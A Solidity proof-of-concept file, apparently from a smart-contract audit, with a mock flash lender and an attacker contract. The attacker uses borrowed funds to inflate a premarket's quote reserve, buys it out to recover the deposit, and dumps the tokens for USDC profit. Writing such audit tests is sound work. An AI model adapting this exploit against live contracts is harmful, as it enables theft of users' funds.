// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

interface IFlashBorrower {
    function onFlashLoan(address asset, uint256 amount, bytes calldata data) external;
}

/**
 * @dev Minimal uncollateralised lender. Lends `amount` and requires its balance
 *      to be whole again by the end of the call — enough to prove the attack
 *      below needs no capital of its own in the borrowed asset.
 */
contract MockFlashLender {
    using SafeERC20 for IERC20;

    function flashLoan(
        IERC20 asset,
        uint256 amount,
        address receiver,
        bytes calldata data
    ) external {
        uint256 balanceBefore = asset.balanceOf(address(this));
        asset.safeTransfer(receiver, amount);
        IFlashBorrower(receiver).onFlashLoan(address(asset), amount, data);
        require(asset.balanceOf(address(this)) >= balanceBefore, "flash loan not repaid");
    }
}

interface IPreMarketLike {
    function swap(uint256 amountIn, uint256 minAmountOut, bool tokenToQuote, address to)
        external returns (uint256 amountOut);
    function buyout(uint256 maxUsdc, uint256 minQuoteOut)
        external returns (address pool, uint256 lpNftId);
}

interface IPoolLike {
    function swap(uint256 amountIn, uint256 minAmountOut, bool tokenToUsdc, address recipient)
        external;
}

/**
 * @title  PreMarketFlashAttacker
 * @notice Executes the C-2 round trip atomically, with the quote leg borrowed.
 *
 *         1. Borrow `quote` — no capital of the attacker's own.
 *         2. Swap all of it into the premarket, taking out the token reserve.
 *         3. Buy out. The buyout hands over the WHOLE quote reserve, which now
 *            includes the borrowed amount, so the deposit comes straight back.
 *         4. Repay the loan.
 *         5. Dump the tokens into the market the buyout just launched, so the
 *            profit is realised in USDC rather than left in an illiquid token.
 *
 *         Net USDC across the whole call is the number the test asserts on. The
 *         attack is only interesting if that number is positive.
 */
contract PreMarketFlashAttacker is IFlashBorrower {
    using SafeERC20 for IERC20;

    IERC20 public immutable token;
    IERC20 public immutable quote;
    IERC20 public immutable usdc;
    IPreMarketLike public immutable preMarket;
    MockFlashLender public immutable lender;

    address public launchedPool;
    uint256 public tokensTaken;
    uint256 public quoteReceived;
    uint256 public usdcPaid;
    uint256 public usdcFromDump;

    constructor(
        address token_,
        address quote_,
        address usdc_,
        address preMarket_,
        address lender_
    ) {
        token     = IERC20(token_);
        quote     = IERC20(quote_);
        usdc      = IERC20(usdc_);
        preMarket = IPreMarketLike(preMarket_);
        lender    = MockFlashLender(lender_);
    }

    /// @param borrow   Quote to flash-borrow and push through the premarket.
    /// @param maxUsdc  Cost guard forwarded to buyout.
    function attack(uint256 borrow, uint256 maxUsdc) external {
        lender.flashLoan(quote, borrow, address(this), abi.encode(maxUsdc));
    }

    function onFlashLoan(address, uint256 amount, bytes calldata data) external override {
        require(msg.sender == address(lender), "only lender");
        uint256 maxUsdc = abi.decode(data, (uint256));

        // 2. Quote in, token out — drains the token reserve along the curve.
        //    amount == 0 is the control case: a plain buyout with no inflation,
        //    which is the legitimate auction and the baseline to beat.
        if (amount != 0) {
            quote.forceApprove(address(preMarket), amount);
            tokensTaken = preMarket.swap(amount, 0, false, address(this));
        }

        // 3. Buy out. Cost is read off the auction; the entire quote reserve,
        //    borrowed portion included, is transferred to this contract.
        uint256 usdcBefore  = usdc.balanceOf(address(this));
        uint256 quoteBefore = quote.balanceOf(address(this));
        usdc.forceApprove(address(preMarket), maxUsdc);
        (address pool, ) = preMarket.buyout(maxUsdc, 0);
        launchedPool  = pool;
        usdcPaid      = usdcBefore - usdc.balanceOf(address(this));
        quoteReceived = quote.balanceOf(address(this)) - quoteBefore;

        // 4. Repay. Reverts inside the lender if the buyout did not return enough.
        quote.safeTransfer(address(lender), amount);

        // 5. Realise the token side against the freshly launched market.
        uint256 held = token.balanceOf(address(this));
        if (held != 0) {
            uint256 beforeDump = usdc.balanceOf(address(this));
            token.forceApprove(pool, held);
            IPoolLike(pool).swap(held, 0, true, address(this));
            usdcFromDump = usdc.balanceOf(address(this)) - beforeDump;
        }
    }
}
